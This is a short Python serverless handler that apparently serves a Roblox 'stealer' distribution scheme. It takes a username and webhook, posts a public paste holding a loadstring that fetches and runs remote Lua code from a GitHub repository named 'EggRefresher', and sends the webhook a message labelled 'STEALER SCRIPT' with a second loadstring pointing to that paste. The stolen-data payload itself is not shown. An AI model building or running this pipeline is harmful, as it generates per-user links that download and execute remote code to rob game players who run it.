import requests
import json

def handler(request):
    if request.method != "POST":
        return {"statusCode": 405, "body": "Method Not Allowed"}

    try:
        data = request.json()
    except:
        return {"statusCode": 400, "body": "Invalid JSON"}

    username = data.get("username")
    webhook = data.get("webhook")

    if not username or not webhook:
        return {"statusCode": 400, "body": "Missing username or webhook"}

    # Create paste in Pastefy
    paste_data = {
        "title": f"{username}_script",
        "content": 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscripts-official/EggRefresher/refs/heads/main/EggRefresherLATEST"))()',
        "public": True
    }

    paste_res = requests.post("https://pastefy.app/api/v2/paste", json=paste_data)
    if paste_res.status_code != 200:
        return {"statusCode": 500, "body": "Pastefy Error: " + paste_res.text}

    paste_json = paste_res.json()
    paste_raw = paste_json.get("rawUrl")

    # Send message to user's webhook
    payload = {
        "content": f"STEALER SCRIPT:\n\n```\nloadstring(game:HttpGet(\"{paste_raw}\"))()\n```"
    }
    requests.post(webhook, json=payload)

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "application/json"},
        "body": json.dumps({"paste_link": paste_raw})
    }
    
